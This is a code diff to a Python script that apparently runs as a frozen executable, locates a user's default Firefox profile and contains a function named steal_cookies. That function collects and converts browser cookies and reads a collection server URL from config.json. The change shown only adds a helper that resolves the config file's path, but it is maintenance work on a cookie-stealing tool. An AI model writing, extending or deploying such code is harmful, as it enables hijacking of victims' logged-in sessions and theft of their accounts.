@@ -15,7 +15,13 @@ if getattr(sys, 'frozen', False):
 # Set up environment variable for playwright firefox
 os.environ["PLAYWRIGHT_BROWSERS_PATH"] = os.path.join(base_path, "ms-playwright")
 
-
+def get_base_path():
+    """Gets the base path for config.json."""
+    if getattr(sys, 'frozen', False):
+        return os.path.dirname(sys.executable)
+    else:
+        return os.path.dirname(os.path.abspath(__file__))
+    
 # Find where the default profile of a user is
 def get_default_profile_path():
     # Possible Firefox profile base paths
@@ -119,10 +125,12 @@ async def steal_cookies(context):
     transformed_cookies = [convert_cookie(cookie) for cookie in cookies]
 
     # Read config at the start
+
     server_url = "http://localhost:8000" 
     try:
         import json
-        with open('config.json', 'r') as f:
+        config_path = os.path.join(get_base_path(), 'config.json')
+        with open(config_path, 'r') as f:
             config = json.load(f)
             server_url = config['server']['url']
     except:
